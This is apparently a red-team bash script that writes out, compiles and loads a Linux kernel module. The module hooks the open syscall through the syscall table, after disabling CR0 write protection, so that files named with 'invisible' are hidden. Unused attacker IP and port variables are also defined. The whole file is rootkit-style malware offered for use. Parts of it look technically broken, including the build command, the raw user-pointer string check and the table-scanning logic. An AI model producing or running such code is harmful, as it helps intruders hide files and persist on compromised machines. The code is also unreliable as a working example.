#!/bin/bash

# Red Team - Live Kernel Patching for Syscall Hooking

# Loadable kernel module for live patching of the syscall table
KERNEL_MODULE_SRC="/tmp/syscall_hook.c"
ATTACKER_BACKDOOR_CMD="invisible"
ATTACKER_PORT="4444"
ATTACKER_IP="192.168.1.100"

cat << EOF > $KERNEL_MODULE_SRC
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/fs.h>

unsigned long **syscall_table;
asmlinkage long (*original_open)(const char __user *filename, int flags, mode_t mode);

asmlinkage long hooked_open(const char __user *filename, int flags, mode_t mode) {
    // Hide files that contain "invisible" in their name
    if (strstr(filename, "$ATTACKER_BACKDOOR_CMD")) {
        return -ENOENT;
    }
    return original_open(filename, flags, mode);
}

static unsigned long **find_syscall_table(void) {
    unsigned long offset = PAGE_OFFSET;
    while (offset < ULLONG_MAX) {
        unsigned long **table = (unsigned long **) offset;
        if (table[__NR_close] == (unsigned long *) sys_close) {
            return table;
        }
        offset += sizeof(void *);
    }
    return NULL;
}

static int __init hook_init(void) {
    syscall_table = find_syscall_table();
    if (!syscall_table) {
        return -1;
    }

    // Disable write protection on the syscall table
    write_cr0(read_cr0() & (~0x10000));

    // Save the original sys_open and hook it
    original_open = (void *)syscall_table[__NR_open];
    syscall_table[__NR_open] = (unsigned long *)hooked_open;

    // Re-enable write protection
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "Syscall hooking initialized.\n");
    return 0;
}

static void __exit hook_exit(void) {
    // Restore the original syscall
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_open] = (unsigned long *)original_open;
    write_cr0(read_cr0() | 0x10000);

    printk(KERN_INFO "Syscall hooking removed.\n");
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL");
EOF

# Compile the kernel module
echo "[+] Compiling kernel module..."
gcc -o /tmp/syscall_hook.ko -nostdinc -isystem /usr/lib/modules/$(uname -r)/build/include -include /usr/include/linux/kconfig.h -D__KERNEL__ -DMODULE $KERNEL_MODULE_SRC

# Insert the kernel module to patch the syscall table
echo "[+] Loading kernel module for syscall hooking..."
insmod /tmp/syscall_hook.ko

echo "[+] Syscall table hooked! Files containing '$ATTACKER_BACKDOOR_CMD' are now hidden."